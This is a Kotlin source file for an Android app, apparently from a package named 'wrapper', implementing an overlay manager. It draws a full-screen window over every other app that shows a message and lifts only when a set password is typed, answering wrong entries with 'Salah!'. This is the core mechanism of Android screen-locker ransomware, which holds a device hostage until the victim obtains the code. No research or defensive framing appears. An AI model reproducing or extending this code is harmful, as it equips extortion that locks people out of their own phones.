package com.rfhvx.wrapper
import android.annotation.SuppressLint
import android.content.Context
import android.graphics.PixelFormat
import android.os.Build
import android.provider.Settings
import android.view.*
import android.widget.*
object OverlayManager {
    private var wm: WindowManager? = null
    private var view: View? = null
    @SuppressLint("InflateParams")
    fun show(ctx: Context, msg: String, pass: String, onUnlock: () -> Unit) {
        if (!Settings.canDrawOverlays(ctx) || view != null) return
        wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        view = LayoutInflater.from(ctx).inflate(R.layout.overlay_lock, null)
        view?.findViewById<TextView>(R.id.overlayMessage)?.text = msg
        view?.findViewById<Button>(R.id.overlayUnlockBtn)?.setOnClickListener {
            val input = view?.findViewById<EditText>(R.id.overlayUnlockInput)?.text.toString()
            if (input == pass) { hide(); onUnlock() } else Toast.makeText(ctx, "Salah!", Toast.LENGTH_SHORT).show()
        }
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE
        val params = WindowManager.LayoutParams(WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT, type, WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_FULLSCREEN, PixelFormat.TRANSLUCENT)
        wm?.addView(view, params)
    }
    fun hide() { try { view?.let { wm?.removeView(it) } } catch(e:Exception){}; view = null }
}
